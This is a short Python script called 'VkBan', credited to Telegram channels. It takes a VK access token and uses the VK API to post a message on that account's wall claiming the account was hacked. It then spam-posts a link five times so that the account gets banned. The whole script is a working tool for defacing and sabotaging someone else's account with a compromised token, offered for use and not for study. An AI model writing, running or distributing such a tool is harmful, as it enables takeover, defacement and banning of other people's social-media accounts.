import requests
import vk_api
import os
import time
from colorama import Fore, Back, Style 
def fastban():
    os.system("clear")
    intro = '''
\033[32m\033[01m
VkBan
\033[0m
      .:Monocode:. .:|t.me/monocode|:.
'''
    print(Fore.RED + "\033[1m" + intro)
    print(Fore.WHITE + """                                  
[1] WALL-POST-BAN                        
[2] DEVOLOPERS                          
[3] EXIT                                 
    """)
    a = input("[Enter number] -> ")
    if a == "1":
        try:
            tok = input("[ACCESS-TOKEN] -> ") 
            token = vk_api.VkApi(token = tok) 
            vk = token.get_api()
            vk.wall.post(message='Твоя жопа взломана! Ответственность взял канал в телеграмме @coding_lab')
            for var in range(5):
                time.sleep(3)
                vk.wall.post(message='vto.pe')             
                print(Fore.BLACK + Back.GREEN + "[log] Сообщение отправленно. Ожидайте бана!")
            print(Back.BLACK + Fore.WHITE)
            os.system("clear")
            fastban()
        except Exception as er:
            print('Невалидный токен или страница в бане')
            fastban()
    if a == "2":
        print("""                                  
 DEVOLOPERS                               
 TELEGRAM: monocode                  
 TELEGRAM: @pkgsearch                
 Для выхода в главное меню нажмите Enter   
        """)
        c = input("-> : ")
        if c == "1":
            os.system("clear")
            fastban()
        else:
            os.system("clear")
            fastban()
    if a == "3":
        os.system("exit")
    else:
        fastban()
